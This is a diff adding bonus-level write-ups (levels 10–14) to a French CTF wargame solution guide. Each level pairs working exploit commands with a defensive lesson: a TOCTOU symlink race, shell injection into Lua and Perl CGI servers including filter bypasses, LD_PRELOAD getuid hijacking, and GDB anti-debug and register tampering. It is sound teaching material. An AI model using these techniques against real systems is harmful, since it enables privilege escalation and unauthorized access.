@@ -7,6 +7,7 @@
 
 **Environnement** : VM 64-bit (ISO fournie), accès SSH sur le port `4242`.
 **Login initial** : `level00` / `level00`.
+**Périmètre** : partie obligatoire (00–09) + bonus (10–14), soit les 15 niveaux.
 
 **Méthode appliquée à chaque niveau** : exploration de base avant analyse.
 
@@ -465,6 +466,292 @@ transformer.
 
 ---
 
+## Level10 — Race condition TOCTOU
+
+**Contexte**
+Un binaire SUID `level10` (propriété de `flag10`) envoie le contenu d'un fichier
+vers un host sur le port 6969, *si l'utilisateur a accès au fichier*. Logique
+reconstruite via `strings` (présence de `access`, `open`, `read`, fonctions
+réseau `socket`/`connect`) :
+
+```c
+if (access(file, R_OK) != 0) {
+    printf("You don't have access to %s\n", file);
+    exit(1);
+}
+fd = open(file, O_RDONLY);   // ouverture SÉPARÉE de la vérification
+read(fd, buffer, ...);       // puis envoi réseau
+```
+
+**Vulnérabilité**
+`access` vérifie les droits, puis `open` ouvre le fichier — deux opérations
+distinctes séparées par un délai. Le développeur suppose que le fichier vérifié
+et le fichier ouvert sont identiques. En manipulant un lien symbolique entre les
+deux instants, on casse cette hypothèse. C'est une faille **TOCTOU**
+(Time-Of-Check to Time-Of-Use).
+
+> Le `host` attendu est une **IP** (le binaire utilise `inet_addr`), donc
+> `127.0.0.1` et non `localhost`.
+
+**Exploitation**
+On fait osciller en boucle la cible d'un symlink entre un fichier autorisé
+(passe `access`) et `token` (lu par `open`), tout en martelant le binaire et en
+écoutant le port. C'est une **race condition** : on court contre le programme
+pour basculer le lien au bon moment.
+
+```bash
+# Terminal 1 — oscillation du lien
+echo leurre > /tmp/monfichier
+while true; do ln -sf /tmp/monfichier /tmp/lien; ln -sf /home/user/level10/token /tmp/lien; done
+
+# Terminal 2 — appel répété du binaire
+while true; do ./level10 /tmp/lien 127.0.0.1; done
+
+# Terminal 3 — écoute
+nc -lk 6969
+```
+
+Statistiquement, le lien finit par pointer vers le fichier autorisé pile au
+moment du `access` et vers `token` pile au moment du `open`. Le token apparaît
+alors dans `nc`.
+
+**Notion clé**
+Une vérification de droits (`access`) et l'utilisation effective (`open`)
+doivent porter sur la **même ressource atomiquement**. Vérifier puis utiliser en
+deux temps ouvre une fenêtre exploitable. Bonne pratique : ouvrir d'abord, puis
+vérifier les droits sur le descripteur (`fstat`), plutôt que `access` + `open`.
+
+---
+
+## Level11 — Injection de commande dans un serveur Lua
+
+**Contexte**
+Un script Lua tourne en permanence comme serveur réseau, lancé par `flag11`
+(repéré via `find / -user flag11` qui révèle `/proc/1955`, confirmable avec
+`ps aux | grep lua`). Il écoute sur `127.0.0.1:5151`, demande un mot de passe,
+et le hache :
+
+```lua
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  ...
+end
+```
+
+**Vulnérabilité**
+L'entrée du client (`pass`) est concaténée directement dans une commande shell
+passée à `io.popen`, sans validation ni échappement. Le serveur tournant sous
+`flag11`, toute commande injectée s'exécute avec ses droits.
+
+**Le piège à éviter**
+La comparaison du hash à `f05d1d066...` est un leurre : la satisfaire
+reviendrait à casser un SHA1 (infaisable). Le message `Erf nope..` / `Gz you
+dumb*` n'a aucune importance — la cible n'est pas la comparaison mais
+l'exécution de code via `io.popen`.
+
+**Exploitation**
+On se connecte avec netcat et on injecte une commande exécutant `getflag`, en
+redirigeant sa sortie vers un fichier lisible (sinon elle part dans le
+`| sha1sum`) :
+
+```bash
+nc 127.0.0.1 5151
+# Password: ; getflag > /tmp/flag11; echo
+cat /tmp/flag11
+```
+
+Le `;` termine le `echo` initial, `getflag` s'exécute sous `flag11`, sa sortie
+est sauvegardée, et le `echo` final neutralise le `| sha1sum` qui suit.
+
+**Notion clé**
+Même leçon que les levels 04 et 07, dans un nouveau contexte (serveur réseau
+Lua). Détail propre à ce vecteur : quand la sortie de la commande vulnérable est
+consommée par un pipe, rediriger vers un fichier permet de récupérer le résultat.
+
+---
+
+## Level12 — Injection Perl CGI avec contraintes de filtrage
+
+**Contexte**
+Un script Perl CGI (`localhost:4646`), propriété de `flag12` avec SUID, insère
+un paramètre utilisateur dans une commande shell via backticks :
+
+```perl
+$xx = $_[0];
+$xx =~ tr/a-z/A-Z/;        # passage en MAJUSCULES
+$xx =~ s/\s.*//;           # coupe au premier ESPACE
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+```
+
+**Vulnérabilité**
+Injection de commande, bridée par deux transformations sur l'entrée : mise en
+majuscules et suppression de tout ce qui suit le premier espace.
+
+**Les obstacles et leurs contournements**
+- *Pas d'espace possible* → `${IFS}` (séparateur de champs shell) remplace
+  l'espace.
+- *Tout passe en majuscules* → impossible d'écrire `getflag` ou `/tmp/` (qui
+  deviendrait `/TMP/`). Solution : déporter le code minuscule dans un **script
+  externe** (`/tmp/SCRIPT.SH`, nom en majuscules), dont le contenu n'est pas
+  affecté par le `tr`.
+- *Désigner le script sans écrire `tmp` en minuscules* → **globbing** :
+  `/*/SCRIPT.SH`, où le `*` (non alphabétique) survit au `tr` et s'étend vers
+  `/tmp/SCRIPT.SH`.
+- *Forcer l'exécution* → la **substitution de commande** (backticks) s'évalue
+  toujours en premier, contrairement au `;` qui se faisait absorber dans les
+  guillemets de `egrep`.
+
+**Exploitation**
+```bash
+# /tmp/SCRIPT.SH (exécutable, chmod +x) :
+#   #!/bin/sh
+#   getflag > /tmp/flag1
+
+curl "http://localhost:4646/?x=%60/*/SCRIPT.SH%60&y=salut"
+cat /tmp/flag1
+```
+`%60` = backtick encodé pour l'URL. Le serveur exécute `` `/*/SCRIPT.SH` `` sous
+l'identité `flag12`.
+
+**Méthode de debug clé**
+Face à un service opaque, on a inséré un mouchard (`id > /tmp/MOUCHARD`) dans le
+script pour confirmer l'exécution et l'identité effective. C'est ce point
+d'observation qui a permis d'isoler le vrai problème (le vecteur d'exécution :
+backticks plutôt que `;`).
+
+**Notion clé**
+Un filtre d'entrée (majuscules, suppression d'espaces) complique l'injection
+mais ne la prévient pas : on déporte les contraintes (script externe), on
+contourne avec des caractères non filtrés (`*`, `${IFS}`, backticks). Filtrer ≠
+sécuriser.
+
+---
+
+## Level13 — Détournement de fonction via LD_PRELOAD
+
+**Contexte**
+Un binaire SUID `level13` (propriété de `flag13`) vérifie l'UID de l'utilisateur
+et n'affiche le token que si cet UID vaut `4242` :
+
+```c
+if (getuid() != 4242) {
+    printf("UID %d started us but we we expect %d\n", getuid(), 4242);
+    exit(1);
+}
+// sinon : déchiffre (ft_des) et affiche le token
+```
+L'UID 4242 n'existe pas sur le système (`/etc/passwd`).
+
+**Vulnérabilité**
+Le binaire fait confiance à `getuid()`, fonction de la libc chargée
+dynamiquement. La variable `LD_PRELOAD` permet de précharger une bibliothèque
+personnelle dont les fonctions **écrasent** celles de la libc. On fournit donc
+un `getuid()` maison retournant `4242`.
+
+**L'obstacle du SUID**
+Le linker dynamique **ignore `LD_PRELOAD` sur les binaires SUID** (protection :
+empêcher l'injection de code dans un programme privilégié). Le preload reste
+donc sans effet sur le binaire d'origine.
+
+**Contournement**
+Le binaire n'a pas besoin de son SUID (il déchiffre et affiche le token
+lui-même une fois `getuid()` validé). En **copiant** `level13` dans `/tmp`, la
+copie perd le bit SUID et appartient à `level13` → `LD_PRELOAD` redevient actif.
+
+**Exploitation**
+```c
+// fake.c
+int getuid(void) { return 4242; }
+```
+```bash
+gcc -m32 -fPIC -c fake.c -o fake.o          # -m32 : rester en 32 bits
+gcc -m32 -shared -o /tmp/fake.so fake.o
+cp /home/user/level13/level13 /tmp/level13  # copie : perd le SUID
+export LD_PRELOAD=/tmp/fake.so
+/tmp/level13
+```
+
+**Notion clé**
+La liaison dynamique est un vecteur d'attaque : `LD_PRELOAD` permet de
+substituer n'importe quelle fonction de bibliothèque. Le système s'en protège
+sur les binaires SUID, mais cette protection tombe dès qu'on retire le SUID. Ne
+jamais faire reposer une décision de sécurité sur une fonction librement
+remplaçable.
+
+---
+
+## Level14 — Contournement anti-debug et falsification de registre (GDB)
+
+**Contexte**
+Home vide, `find / -user flag14` ne retourne rien. Le seul vecteur est le binaire
+`getflag` lui-même (`/bin/getflag`), qui contient une table de tokens chiffrés
+(`ft_des`) et affiche celui correspondant à l'UID réel qui le lance. Le token de
+flag14 nécessite l'UID `3014`.
+
+**Les deux protections**
+1. `ptrace(PTRACE_TRACEME, ...)` : auto-traçage anti-debug. Si un débogueur est
+   attaché, l'appel échoue et le programme affiche `You should not reverse this`
+   puis quitte.
+2. Comparaison de l'UID réel à `3014` avant d'afficher le token. `LD_PRELOAD` est
+   bloqué (détection via `/proc/self/maps`), donc la méthode du level13 est
+   inopérante.
+
+**Exploitation (approche GDB, la plus formatrice)**
+
+Contourner `ptrace` en interceptant le syscall et en forçant sa valeur de retour
+(`$eax`) à 0 :
+```
+gdb /bin/getflag
+catch syscall ptrace
+commands 1
+set ($eax) = 0
+continue
+end
+```
+
+Identifier la comparaison d'UID dans le désassemblage (`disass main`) :
+```asm
+0x08048afd: call   <getuid@plt>      ; $eax = UID réel (2014)
+0x08048b02: mov    %eax,0x18(%esp)   ; sauvegarde sur la pile
+0x08048b06: mov    0x18(%esp),%eax   ; recharge dans $eax
+0x08048b0a: cmp    $0xbbe,%eax       ; compare à 0xbbe = 3014
+0x08048b0f: je     <main+901>        ; saut vers la branche "affiche token"
+```
+
+Poser un breakpoint juste avant le `cmp` et forcer `$eax` à 3014 :
+```
+b *0x08048b0a
+run
+set ($eax) = 3014
+continue
+```
+La comparaison `3014 == 3014` réussit, le `je` saute vers la branche qui
+déchiffre et affiche le token.
+
+**Lecture de l'assembleur (syntaxe AT&T)**
+- `$0xbbe` : valeur immédiate (`$` = constante), `0xbbe` = 3014.
+- `%eax` : registre (`%` = registre). En i386, valeur de retour des fonctions.
+- Ordre `source, destination` (inverse d'Intel). `cmp $0xbbe,%eax` = compare eax
+  à 3014.
+
+**Approches alternatives**
+- *Reverse hors-ligne* : décompiler `getflag`, extraire le token chiffré de
+  flag14, réimplémenter `ft_des` dans un programme C local et déchiffrer
+  hors-ligne. Aucune interaction avec la VM, mais reverse complet de
+  l'algorithme.
+- *Dirty COW (CVE-2016-5195)* : exploiter une faille du noyau pour devenir
+  root, puis `su flag14`. Disproportionné et destructif, mais illustre une vraie
+  escalade système (possible car la VM utilise un noyau ancien et vulnérable).
+
+**Notion clé**
+Les protections anti-debug (`ptrace`) se contournent en interceptant le syscall.
+Une décision de sécurité prise côté client (comparaison d'UID en mémoire) est
+falsifiable par qui contrôle l'exécution : un débogueur peut réécrire registres
+et mémoire à la volée. Un même objectif admet plusieurs chemins, à différents
+niveaux d'abstraction (programme ciblé, reverse hors-ligne, exploit kernel).
+
+---
+
 ## Récapitulatif des techniques
 
 | Level | Domaine | Technique |
@@ -479,6 +766,11 @@ transformer.
 | 07 | Système | Injection via variable d'environnement |
 | 08 | Système | Contournement de filtre par symlink |
 | 09 | Reverse | Reverse d'un chiffrement maison |
+| 10 | Système | Race condition TOCTOU |
+| 11 | Réseau/Web | Injection de commande (serveur Lua) |
+| 12 | Web | Injection Perl avec contournement de filtres |
+| 13 | Système | Détournement de fonction (`LD_PRELOAD`) |
+| 14 | Reverse | Anti-debug + falsification de registre (GDB) |
 
 ## Principes transversaux
 
@@ -492,6 +784,10 @@ transformer.
   paramètre HTTP, variable d'environnement, nom de fichier — tout est un vecteur.
 - **Sécurité par l'obscurité ≠ sécurité** : un secret cesse de protéger dès qu'il
   est compris.
+- **Un objectif, plusieurs chemins** : un même accès peut s'obtenir en ciblant le
+  programme (GDB), en le contournant (reverse hors-ligne) ou en attaquant le
+  système sous-jacent (exploit kernel). Le choix dépend de la discrétion, de la
+  fiabilité et de l'effort.
 
 ## Note sur les outils (portabilité soutenance)
 
